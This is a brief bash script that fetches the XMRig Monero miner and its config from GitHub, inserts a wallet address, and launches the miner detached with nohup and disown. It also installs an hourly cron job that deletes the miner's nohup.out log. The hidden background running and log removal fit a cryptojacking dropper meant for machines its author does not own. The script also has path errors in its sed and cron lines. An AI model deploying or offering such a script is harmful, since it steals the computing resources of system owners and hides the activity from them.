#!/bin/bash

# Gather dependencies
miner_url="https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz"
config_url="https://raw.githubusercontent.com/xmrig/xmrig/master/src/config.json"

# Download miner
wget $miner_url
tar -xvzf xmrig-6.19.0-linux-x64.tar.gz
rm xmrig-6.19.0-linux-x64.tar.gz

# Download config file
wget $config_url -O xmrig-6.19.0/config.json

# Set sending address
address="WALLETADD"
sed -i "s/YOUR_WALLET_ADDRESS/$address/g" /xmrig-6.19.0/config.json


# Start miner
cd xmrig-6.19.0/
chmod +x xmrig
nohup ./xmrig --config=config.json & disown

# Add a cron job to remove the nohup.out file every hour
(crontab -l 2>/dev/null; echo "0 * * * * rm nohup.out") | crontab -
